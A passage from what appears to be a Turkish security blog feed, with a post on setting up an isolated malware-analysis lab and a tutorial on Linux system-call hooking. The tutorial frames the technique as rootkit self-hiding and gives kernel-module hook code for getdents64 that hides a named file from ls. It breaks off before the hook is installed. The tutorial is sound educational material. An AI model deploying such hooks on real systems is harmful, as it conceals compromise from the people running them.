&lt;p&gt;Umarım yazıyı okurken keyif almışsınızdır.&lt;/p&gt;

&lt;p&gt;Sorular için twitter : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Malware Analysis - Static Analysis (Part 2)</summary></entry><entry><title type="html">Malware Analysis - Lab Setup (Part 1)</title><link href="http://localhost:4000/2019/05/16/malware-analysis-part-1.html" rel="alternate" type="text/html" title="Malware Analysis - Lab Setup (Part 1)" /><published>2019-05-16T00:00:00+03:00</published><updated>2019-05-16T00:00:00+03:00</updated><id>http://localhost:4000/2019/05/16/malware-analysis-part-1</id><content type="html" xml:base="http://localhost:4000/2019/05/16/malware-analysis-part-1.html">&lt;h1 id=&quot;malware-analysis-part-1&quot;&gt;Malware Analysis (Part 1)&lt;/h1&gt;

&lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;Malware Analizi&lt;/strong&gt; serimin ilk part’ına hoşgeldiniz.&lt;/p&gt;

&lt;p&gt;Bu part içerisinde bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Analiz&lt;/strong&gt;‘ini yapacağımız &lt;strong&gt;Lab&lt;/strong&gt;‘ı oluşturacağız.&lt;/p&gt;

&lt;p&gt;Teknik konulara ileriki partlarda değineceğiz. Şimdi &lt;strong&gt;Lab&lt;/strong&gt;‘imizi kurmaya geçelim yavaştan.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt; kelimesine daha önce denk gelmeyen arkadaşlar için &lt;strong&gt;Twitter&lt;/strong&gt;‘de denk geldiğim bir arkadaşın blog yazısını bırakıyorum buraya :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://uae-ii.blogspot.com/2019/02/kotu-amacl-yazlm-nam-diger-malware.html&quot;&gt;Blog yazısı&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;Lab&lt;/strong&gt; için ben &lt;strong&gt;VMware&lt;/strong&gt; kullanacağım &lt;strong&gt;sanal makine&lt;/strong&gt; olarak.&lt;/p&gt;

&lt;p&gt;Ayrıca ben bir &lt;strong&gt;Portable Executable&lt;/strong&gt;‘ın analizini yapacağımdan &lt;strong&gt;Win 7&lt;/strong&gt; kurdum test makinesi olarak.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/V9Za9V.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bunun dışında birde &lt;strong&gt;Malware&lt;/strong&gt;‘nin :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;HTTP&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;HTTPS&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;DNS&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;SMTP&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;POP3&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;FTP&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Protokolleri&lt;/strong&gt; gibi ağ üzerinde gerçekleştirdiği &lt;strong&gt;request&lt;/strong&gt;‘leri dinleyeceğimiz ve &lt;strong&gt;Win 7&lt;/strong&gt;‘nin &lt;strong&gt;gateway&lt;/strong&gt;‘i olarak kullanacağımız &lt;strong&gt;Tersine Mühendis&lt;/strong&gt;‘leri ve &lt;strong&gt;Malware 
Analist&lt;/strong&gt;‘leri için özel geliştirilmiş &lt;strong&gt;REMnux&lt;/strong&gt;‘u kullanacağım.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/V9Za9r.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Eğer &lt;strong&gt;işletim sistem&lt;/strong&gt;‘lerinde tamamsak şayet şimdi &lt;strong&gt;Network Configuration&lt;/strong&gt; kısmımıza geçmeden önce biraz &lt;strong&gt;Statik&lt;/strong&gt;, &lt;strong&gt;Dinamik&lt;/strong&gt;, &lt;strong&gt;Snapshot&lt;/strong&gt; ve &lt;strong&gt;Malware&lt;/strong&gt; anahtar kelimelerinden bahsedelim.&lt;/p&gt;

&lt;h1 id=&quot;dynamic-vs-static-analysis&quot;&gt;Dynamic vs Static Analysis&lt;/h1&gt;

&lt;p&gt;Örnek veriyorum elimizde bir &lt;strong&gt;Portable Executable&lt;/strong&gt; yani çalıştırılabilir bir dosyamız var &lt;strong&gt;Malware&lt;/strong&gt; olarak. Bu &lt;strong&gt;Malware&lt;/strong&gt;‘yi çalıştırmadan ne yaptığını anlamak &lt;strong&gt;Statik Analiz&lt;/strong&gt; ile mümkün. Anlatmaya devam etmeden önce &lt;strong&gt;Statik&lt;/strong&gt; ve &lt;strong&gt;Dinamik&lt;/strong&gt; analizlerinin neler olduklarına bir bakalım.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Static Analysis&lt;/strong&gt;&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt;‘yi çalıştırmadan incelemek&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Disassemble&lt;/strong&gt; edip içerisinde bulunduğu instructionları gözlemlemek&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;İçerdiği &lt;strong&gt;Library&lt;/strong&gt; ve &lt;strong&gt;Function&lt;/strong&gt;‘ları görüntülemek&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;İçerdiği &lt;strong&gt;String&lt;/strong&gt;‘leri görüntülemek&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Pack&lt;/strong&gt; edildimi edilmedimi &lt;strong&gt;PEid&lt;/strong&gt; gibi bir tool ile test etmek&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://uldissprogis.files.wordpress.com/2016/01/static-analysis-dynamic-analysis.jpg?w=640&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Dynamic Analysis&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt;‘yi çalışırken incelemek&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;Bir &lt;strong&gt;Debugger&lt;/strong&gt; aracılığı ile içerisindeki instructionları gözlemlemek&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;Bir &lt;strong&gt;Sanal Makine&lt;/strong&gt; içerisinde &lt;strong&gt;Snapshot&lt;/strong&gt; aldıktan sonra çalıştırıp &lt;strong&gt;Etkisini&lt;/strong&gt; gözlemleyip eski &lt;strong&gt;Snapshot&lt;/strong&gt;‘a geri dönmek&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt;‘i çalıştırmadan önce &lt;strong&gt;RegShot&lt;/strong&gt; gibi bir tool ile &lt;strong&gt;Registry&lt;/strong&gt;‘nin &lt;strong&gt;Shot&lt;/strong&gt;‘unu alıp &lt;strong&gt;Malware&lt;/strong&gt; çalıştıktan sonraki &lt;strong&gt;Registry&lt;/strong&gt; ile karşılaştırmak&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt; çalıştıktan sonra &lt;strong&gt;REMnux&lt;/strong&gt; gibi bir &lt;strong&gt;İşletim Sistemi&lt;/strong&gt; içerisinden &lt;strong&gt;Malware&lt;/strong&gt;‘nin gerçekleştirdiği &lt;strong&gt;Protocol Request&lt;/strong&gt;‘lerini gözlemlemek&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Tabi bu yukarıda saydıklarımız sadece bir kaçı. İleride bazılarını daha detaylı inceleyeceğimizden şimdilik sadece kafanızda &lt;strong&gt;Dinamik&lt;/strong&gt; ve &lt;strong&gt;Statik&lt;/strong&gt; analizlerinin neler olduklarına dair bir şema oluşması için yukarıda ekleme yaptım.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Dinamik Analiz&lt;/strong&gt; bize &lt;strong&gt;Malware&lt;/strong&gt;‘yi anlamamız açısından daha iyi yardımcı olacaktır &lt;strong&gt;Yüzeysel&lt;/strong&gt; olarak.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt; çalıştırdığımız &lt;strong&gt;Sanal Makine&lt;/strong&gt; içerisinden asıl makinemize ulaşmaya çalışıyor olması bile muhtemel olabilir.&lt;/p&gt;

&lt;p&gt;Bu yüzden bu &lt;strong&gt;Malware&lt;/strong&gt;‘yi çalıştırdıktan sonra ne olursa olsun bizim &lt;strong&gt;Ana Makinemize&lt;/strong&gt; dokunmayacağından hem &lt;strong&gt;Network&lt;/strong&gt; hemde &lt;strong&gt;VM Escape&lt;/strong&gt; açısından korunaklı olduğumuzdan emin olmamız lazım.&lt;/p&gt;

&lt;p&gt;Bu açıdan &lt;strong&gt;Ağ&lt;/strong&gt;‘ımızı asıl makinemize ulaşılamayacak şekilde düzenlememiz yani &lt;strong&gt;Host&lt;/strong&gt;‘tan &lt;strong&gt;İzole&lt;/strong&gt; etmemiz ve &lt;strong&gt;Sanal Makine&lt;/strong&gt;‘nin bir &lt;strong&gt;Snapshot&lt;/strong&gt;‘unu almamız gerekiyor.&lt;/p&gt;

&lt;h1 id=&quot;virtual-network-and-snapshot&quot;&gt;Virtual Network and Snapshot&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Snapshot&lt;/strong&gt; nedir ? :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Makine&lt;/strong&gt;‘mizin alınmış bir kopyasıdır. &lt;strong&gt;Malware&lt;/strong&gt; çalıştıktan sonra &lt;strong&gt;Sanal Makine&lt;/strong&gt; içerisinde &lt;strong&gt;Kırılmalar&lt;/strong&gt; oluşabilir bu yüzden tekrar eski haline getirmek için bir &lt;strong&gt;Snapshot&lt;/strong&gt;‘unu almamız gereklidir.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;VMware&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;Sanal Makinemiz&lt;/strong&gt; için bir &lt;strong&gt;Snapshot&lt;/strong&gt; alalım :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/r5qM5N.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Snapshot&lt;/strong&gt;‘umuzu aldığımıza göre şimdi &lt;strong&gt;Network Configuration&lt;/strong&gt; kısmına geçebiliriz.&lt;/p&gt;

&lt;p&gt;Bu kısımı görsel ile anlatmak biraz uzun sürebilir bu yüzden hem &lt;strong&gt;REMnux&lt;/strong&gt; hemde &lt;strong&gt;Win 7&lt;/strong&gt; için &lt;strong&gt;Ağ&lt;/strong&gt; ayarlarını yaptığım ve nasıl yapıldığını anlattım.&lt;/p&gt;

&lt;p&gt;Ayrıca bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Protocol Request&lt;/strong&gt;‘lerini canlı olarak nasıl izlendiğini anlattığım videoma alıyım sizleri :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://youtu.be/oCO3xsIktng&quot;&gt;Network Visulation &amp;amp; Malware Request Track Youtube Vid&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;video-hakkında&quot;&gt;Video hakkında&lt;/h1&gt;

&lt;p&gt;Bu videoda kullandığım &lt;strong&gt;inetsim&lt;/strong&gt;, &lt;strong&gt;fakedns&lt;/strong&gt; gibi toollar bize sahte protocol sunucuları oluşturdu.&lt;/p&gt;

&lt;p&gt;Video içerisinde anlattığım &lt;strong&gt;Route Traffic&lt;/strong&gt; olayıda basit bir şekilde bilgisayarı ve interneti olan bir kişi &lt;strong&gt;Google&lt;/strong&gt;‘ye girmek isterse bu trafik &lt;strong&gt;Gateway&lt;/strong&gt;‘inden geçer ve bu gateway ancak izin verirse istediği yere ulaşabilir &lt;strong&gt;Google&lt;/strong&gt;‘ye girmek isteyen kişi.&lt;/p&gt;

&lt;p&gt;Bizde normal bir &lt;strong&gt;Gateway&lt;/strong&gt; kullanmak yerine &lt;strong&gt;Win 7&lt;/strong&gt; için &lt;strong&gt;Gateway&lt;/strong&gt; olarak &lt;strong&gt;REMnux&lt;/strong&gt;‘umuzu kullandık.&lt;/p&gt;

&lt;p&gt;Dolayısıyla &lt;strong&gt;Win 7&lt;/strong&gt; içerisinde geçen tüm &lt;strong&gt;Request&lt;/strong&gt;‘ler bizim &lt;strong&gt;REMnux&lt;/strong&gt;‘umuz içerisine yönlendirildi.&lt;/p&gt;

&lt;p&gt;Bu şekilde de &lt;strong&gt;Malware&lt;/strong&gt;‘mizin internet üzerinde yaptığı tüm istekleri izleyebilir hale geldik.&lt;/p&gt;

&lt;h1 id=&quot;the-end&quot;&gt;THE END&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Malware Analysis&lt;/strong&gt; serimizin ilk part’ını umarım keyifle okumuşsunuzdur.&lt;/p&gt;

&lt;p&gt;İlerideki partlarda &lt;strong&gt;Static&lt;/strong&gt; ve &lt;strong&gt;Dynamic&lt;/strong&gt; analizlere deyineceğim.&lt;/p&gt;

&lt;p&gt;Ve dahada ileriki partlarda dahada teknik detaylara gireceğiz.&lt;/p&gt;

&lt;p&gt;Sağlıcakla Kalın !&lt;/p&gt;</content><author><name></name></author><summary type="html">Malware Analysis (Part 1)</summary></entry><entry><title type="html">Linux System Call Hooking</title><link href="http://localhost:4000/2019/05/07/linux-system-call-hooking.html" rel="alternate" type="text/html" title="Linux System Call Hooking" /><published>2019-05-07T00:00:00+03:00</published><updated>2019-05-07T00:00:00+03:00</updated><id>http://localhost:4000/2019/05/07/linux-system-call-hooking</id><content type="html" xml:base="http://localhost:4000/2019/05/07/linux-system-call-hooking.html">&lt;h1 id=&quot;linux-system-call-hooking&quot;&gt;Linux System Call Hooking&lt;/h1&gt;

&lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;Linux System Call Hooking&lt;/strong&gt; isimli yazıma hoşgeldiniz.&lt;/p&gt;

&lt;p&gt;Bu yazımda sizlere türkçe adı ile &lt;strong&gt;Sistem Çağrısı Kancalama&lt;/strong&gt;‘yı anlatacağım.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;System Call&lt;/strong&gt; nedir kısmına gelmeden önce &lt;strong&gt;rootkit&lt;/strong&gt;‘lerin &lt;strong&gt;System Call Hooking&lt;/strong&gt;‘i neden sıklıkla kullandığını anlatayım.&lt;/p&gt;

&lt;p&gt;Örneğin düşünelim ki bir &lt;strong&gt;Rootkit&lt;/strong&gt; yazdık ve bu &lt;strong&gt;Rootkit&lt;/strong&gt;‘in sistem içerisinde kendini gizlemesi lazım zaten &lt;strong&gt;rootkit&lt;/strong&gt;‘lerin en büyük gereksinimlerinden biri kendini gizlemesi.&lt;/p&gt;

&lt;p&gt;Diyelim ki &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştığında &lt;strong&gt;Rootkit&lt;/strong&gt;‘imiz gösterilmesin istiyoruz. Bunun için bizim &lt;strong&gt;ls&lt;/strong&gt; komutunun içerisindeki &lt;strong&gt;System Call&lt;/strong&gt;‘leri &lt;strong&gt;Hook&lt;/strong&gt; edip &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştığında gelen liste içerisinde bizim komutumuzu gizlemek.&lt;/p&gt;

&lt;p&gt;İlerideki kısımlarda basitce bunu yapacağız ama ondan önce &lt;strong&gt;System Call&lt;/strong&gt; kavramının ne olduğunu öğrenelim.&lt;/p&gt;

&lt;p&gt;Aklınızda ingilizce olarak kalmasını istediğimden buradaki terimleri ingilizce kullanarak devam edicem anlatmaya.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;System Call&lt;/strong&gt;‘lerini aşşağıda ki resimden anlatmaya başlayalım yavaşca :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://www.cs.uregina.ca/Links/class-info/330-bkup/SystemCall_IO/System_Calls.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Öncelike bizim &lt;strong&gt;Executable&lt;/strong&gt;‘ımız &lt;strong&gt;Library Functions&lt;/strong&gt;‘a gider program içerisinde kullanılacak fonksiyonları almak için yada direk olarak &lt;strong&gt;System call&lt;/strong&gt;‘larına başvurur resimde de görebildiğiniz gibi.&lt;/p&gt;

&lt;p&gt;Ayrıca resimde ki okları takip edersek şayet bu &lt;strong&gt;System Call&lt;/strong&gt;‘ların &lt;strong&gt;Kernel&lt;/strong&gt;‘e sonrasında ise &lt;strong&gt;Hardware&lt;/strong&gt;‘e bağlandığını gözlemleyebiliriz.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;System Call&lt;/strong&gt;‘lerin neler olduğunu soracak olursanız aşşağıda bir kaçını listeleyen bir resim bırakıyorum. Tüm sistem çağrılarına yani &lt;strong&gt;System Call&lt;/strong&gt;‘lara ulaşmak istiyorsanız resmin üstüne de fotorafı aldığım web siteyi bırakacağım.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://syscalls.kernelgrok.com/&quot;&gt;Linux Syscall Reference&lt;/a&gt;
&lt;img src=&quot;https://i.hizliresim.com/MVO54g.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yani daha basite indirge edersek şayet &lt;strong&gt;System Call&lt;/strong&gt;‘leri bir program içerisinde kullandığımız örneğin &lt;strong&gt;printf&lt;/strong&gt; gibi bir &lt;strong&gt;Library Function&lt;/strong&gt;‘unun sistem’e uyarlanmış halidir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;System Call&lt;/strong&gt;‘lerini anladığımıza göre &lt;strong&gt;Hooking&lt;/strong&gt; terimine geçebiliriz. Bu terimi daha önce yazdığım blogum olan &lt;a href=&quot;https://blacknbunny.github.io/2019/04/14/Linux-Function-Hooking.html&quot;&gt;Linux Function Hooking&lt;/a&gt; içerisinde anlattım o yüzden bu blogumda anlatmıyacağım.&lt;/p&gt;

&lt;p&gt;Şimdi gelelim bilalin topu kaleye nasıl soktuğuna, pardon pardon bu başka konuydu… yine karıştırdım.&lt;/p&gt;

&lt;p&gt;Gelelim &lt;strong&gt;System Call&lt;/strong&gt;‘lerinin nasıl &lt;strong&gt;Hook&lt;/strong&gt; edildiğine.&lt;/p&gt;

&lt;p&gt;Aslında bu konuda daha önce anlattığım &lt;strong&gt;Function Hooking&lt;/strong&gt;‘e çok benzer bir konu. Aralarında ki bir kaç fark birinin &lt;strong&gt;User-mode&lt;/strong&gt; içerisinde bu yazının ise &lt;strong&gt;Kernel-mode&lt;/strong&gt; içerisinde geçmesi.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/GmdQVV.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Buraya birde &lt;strong&gt;User-mode&lt;/strong&gt; ve &lt;strong&gt;Kernel-mode&lt;/strong&gt; arasındaki farkları anlatan bir stackoverflow çözümünü bırakıyorum : &lt;a href=&quot;https://stackoverflow.com/questions/1311402/what-is-the-difference-between-user-and-kernel-modes-in-operating-systems&quot;&gt;User vs Kernel&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;system-call-trace&quot;&gt;System Call Trace&lt;/h1&gt;

&lt;p&gt;Şayet bir &lt;strong&gt;Executable&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;System Call&lt;/strong&gt;‘leri yakalamak ve incelemek istiyorsak linux içerisinde bulunan &lt;strong&gt;strace&lt;/strong&gt; komutumuz bize çok yardımcı olacaktır.&lt;/p&gt;

&lt;p&gt;Nasıl çalıştığını bilmeyen arkadaşlar için buraya &lt;strong&gt;strace&lt;/strong&gt; komutunu anlatan bir yazı bırakıyorum : &lt;a href=&quot;https://www.tecmint.com/strace-commands-for-troubleshooting-and-debugging-linux/&quot;&gt;Strace&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;ls-komutunu-hook-etme&quot;&gt;LS komutunu hook etme&lt;/h1&gt;

&lt;p&gt;Öncelik ile &lt;strong&gt;ls&lt;/strong&gt; komutunun hangi &lt;strong&gt;System Call&lt;/strong&gt;‘lerini içerdiğini görmek için &lt;strong&gt;strace&lt;/strong&gt; komutunu kullanıyoruz ve çıktımız şu şekilde oluyor :&lt;/p&gt;

&lt;p&gt;Biraz uzun olduğu için pastebin’e ekledim çıktıyı : &lt;a href=&quot;https://pastebin.com/fRjDHF2T&quot;&gt;Strace çıktısı&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Bu çıktının içerisinde gözümüze çarpan bir sürü &lt;strong&gt;System Call&lt;/strong&gt; mevcut olan ve dizin girişlerini alan &lt;strong&gt;getdents64&lt;/strong&gt; sistem çağrısı ilgimizi çekiyor ve &lt;a href=&quot;http://man7.org/linux/man-pages/man2/getdents.2.html&quot;&gt;man page&lt;/a&gt;‘ini incelediğimizde görebiliriz ki :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int getdents(unsigned int fd, struct linux_dirent *dirp,
                unsigned int count);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;4 adet argüman alıyor ama bu argümanların içerisinde bir &lt;strong&gt;structure&lt;/strong&gt; yani bir yapı olan &lt;strong&gt;linux_dirent64&lt;/strong&gt; diğerlerinden farklı olarak &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştıktan sonra gelen listeyi döndürüyor :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
	unsigned long  d_off;     /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char d_name[];  /* Filename (null-terminated) */
	/* length is actually (d_reclen - 2 -
	offsetof(struct linux_dirent, d_name)) */
	/*
	char pad;       // Zero padding byte
	char d_type;    // File type (only since Linux
	// 2.6.4); offset is (d_reclen - 1)
	*/
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ayrıca man page içerisinde bu &lt;strong&gt;System Call&lt;/strong&gt;‘ın &lt;strong&gt;readdir.c&lt;/strong&gt; içerisinde kullanıldığını görebiliyoruz.&lt;/p&gt;

&lt;p&gt;Artık bundan sonrası &lt;strong&gt;LKM&lt;/strong&gt; yani &lt;strong&gt;Loadable Kernel Module&lt;/strong&gt; development’e giriyor ve bunun ne olduğunu bilmeyen arkadaşlarımız varsa aramızda onlar içinde bir yazı yazdım.&lt;/p&gt;

&lt;p&gt;Buradan ulaşabilirsiniz : &lt;a href=&quot;https://blacknbunny.github.io/2019/04/22/loadable-kernel-module.html&quot;&gt;Loadable Kernel Module Development&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;system-call-hooking-i̇çin-lkm-geliştirmek&quot;&gt;System Call Hooking İçin LKM Geliştirmek&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Strace&lt;/strong&gt; komutunu kullanıp &lt;strong&gt;ls&lt;/strong&gt; içerisinden &lt;strong&gt;getdents64&lt;/strong&gt; sistem çağrısını incelersek şayet:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;deadbeef@pop-os:~$ strace ls 2&amp;gt;&amp;amp;1 | grep getdents64
getdents64(3, /* 30 entries */, 32768)  = 960
getdents64(3, /* 0 entries */, 32768)   = 0
deadbeef@pop-os:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;30 adet entry olduğunu görebiliriz bulunduğumuz klasör içerisinde. Doğrulamak için de &lt;strong&gt;wc&lt;/strong&gt; komutunu kullanabiliriz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;deadbeef@pop-os:~$ ls -la | wc -l
30
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Şimdi elde ettiğimiz tüm bu bilgiler ile &lt;strong&gt;LKM&lt;/strong&gt;‘mizi geliştirmeye başlayalım yavaştan.&lt;/p&gt;

&lt;p&gt;Bu kısımı çok basit anlatacağım aramızda anlamakta zorlanan arkadaşlar olur diye.&lt;/p&gt;

&lt;p&gt;Ve tam anlatmaya başlarken kız arkadaşım kabus görüp kalkıyor.&lt;/p&gt;

&lt;p&gt;Evet onu yatıştırdıktan sonra yazıya devam edebilirim.&lt;/p&gt;

&lt;p&gt;Öncelikle kütüphanelerimizi ekleyelim :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/init.h&amp;gt;
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/moduleparam.h&amp;gt;
#include &amp;lt;linux/unistd.h&amp;gt;
#include &amp;lt;linux/semaphore.h&amp;gt;
#include &amp;lt;linux/dirent.h&amp;gt;
#include &amp;lt;asm/cacheflush.h&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sonrasında yazacağımız &lt;strong&gt;LKM&lt;/strong&gt;‘nin detaylarını girelim :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MODULE_AUTHOR(&quot;blacknbunny&quot;);
MODULE_DESCRIPTION(&quot;LS Komutundan cokgizlidosya.txt yi gizlemek&quot;);
MODULE_LICENSE(&quot;GPL&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;İleride daha detaylı anlatacağım &lt;strong&gt;sys_call_table&lt;/strong&gt; :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void **sys_call_table;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;LS&lt;/strong&gt; komutundan saklayacağımız dosya :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define DOSYA_ISMI &quot;cokgizlidosya.txt&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Orjinal &lt;strong&gt;getdents64&lt;/strong&gt; sistem çağrısı :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;asmlinkage int (*org_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu orjinal sistem çağrısı yerine bizim aktaracağımız hookumuz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
        int returnval;
        struct linux_dirent64 *cur = dirp;
        int i = 0;
        returnval = org_getdents64(fd, dirp, count);
        while (i &amp;lt; returnval) {
                if (strncmp(cur-&amp;gt;d_name, DOSYA_ISMI, strlen(DOSYA_ISMI)) == 0) {
                        int reclen = cur-&amp;gt;d_reclen;
                        char *next_rec = (char *)cur + reclen;
                        int len = (int)dirp + returnval - (int)next_rec;
                        memmove(cur, next_rec, len);
                        returnval -= reclen;
                        continue;
                }
                i += cur-&amp;gt;d_reclen;
                cur = (struct linux_dirent*) ((char*)dirp + i);
        }
        return returnval;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Tüm bilgileri toplayıp birleştirdikten sonra bu hooku yazdım.&lt;/p&gt;

